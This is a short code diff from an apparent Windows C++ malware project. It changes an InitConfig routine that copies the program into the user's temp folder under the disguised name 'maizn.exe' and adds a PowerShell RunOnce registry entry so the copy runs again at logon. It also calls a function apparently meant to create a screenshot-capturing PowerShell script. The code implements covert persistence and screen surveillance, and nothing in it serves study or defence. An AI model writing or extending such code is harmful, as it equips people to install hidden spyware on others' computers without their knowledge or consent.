@@ -146,13 +146,18 @@ void InitConfig(string programName)
   char username[UNLEN+1];
   DWORD username_len = UNLEN+1;
   GetUserName(username, &username_len);
+  string programNameFinal = "maizn.exe";
   string pathUsers = "C:\\Users\\";
-  string pathTarget = "\\appdata\\local\\temp\\main.exe";
+  string pathTarget = "\\appdata\\local\\temp\\";
   string input = current_working_directory()+"\\"+programName;
   string output = pathUsers+username+pathTarget;
-  CopyFile(input.c_str(),output.c_str(), TRUE);
-  string commandPowerShell = "powershell New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce -name Main -Value "+output+" -force";
+  CopyFile(input.c_str(),(output+programNameFinal).c_str(), TRUE);
+  string commandPowerShell = "powershell New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce -name Main -Value "+output+programNameFinal+" -force";
   system(commandPowerShell.c_str());
+  if(programName != programNameFinal)
+  {
+    CreatePrintScreenPS1(output);
+  }
 }
 int main(int argc,char *argv[])
 {
